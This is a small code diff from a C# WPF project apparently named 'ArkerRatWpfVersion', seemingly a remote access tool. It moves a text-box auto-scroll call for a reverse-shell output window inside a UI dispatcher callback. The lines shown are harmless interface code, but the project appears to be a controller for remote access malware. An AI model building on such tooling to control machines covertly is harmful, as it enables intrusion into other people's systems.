@@ -68,9 +68,9 @@ namespace ArkerRatWpfVersion
                 Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                 {
                     reverseShellTextOutput.AppendText(data);
+                    reverseShellTextOutput.ScrollToEnd();
                 }));
             }
-            reverseShellTextOutput.ScrollToEnd();
         }
 
         private async void EnterPressed(object sender, KeyEventArgs e)
